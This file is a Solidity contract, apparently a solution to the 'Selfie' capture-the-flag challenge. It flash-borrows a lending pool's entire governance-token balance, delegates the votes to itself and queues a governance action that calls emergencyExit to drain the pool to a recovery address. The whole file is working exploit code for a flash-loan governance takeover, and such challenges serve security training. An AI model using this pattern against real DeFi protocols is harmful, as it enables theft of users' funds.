// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {SelfiePool} from "./SelfiePool.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {DamnValuableVotes} from "../DamnValuableVotes.sol";

contract HackerSelfie is IERC3156FlashBorrower {
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    SelfiePool private immutable pool;
    SimpleGovernance private immutable governance;
    DamnValuableVotes private immutable token;
    address private immutable recovery;
    uint256 public actionId;

    constructor(SelfiePool _pool, SimpleGovernance _governance, DamnValuableVotes _token, address _recovery) {
        pool = _pool;
        governance = _governance;
        token = _token;
        recovery = _recovery;
    }

    function attack() external {
        uint256 amount = token.balanceOf(address(pool));
        pool.flashLoan(this, address(token), amount, "");
    }

    function onFlashLoan(address, address _token, uint256 amount, uint256, bytes calldata)
        external
        returns (bytes32)
    {
        token.delegate(address(this));

        actionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", recovery)
        );

        token.approve(address(pool), amount);
        return CALLBACK_SUCCESS;
    }
}
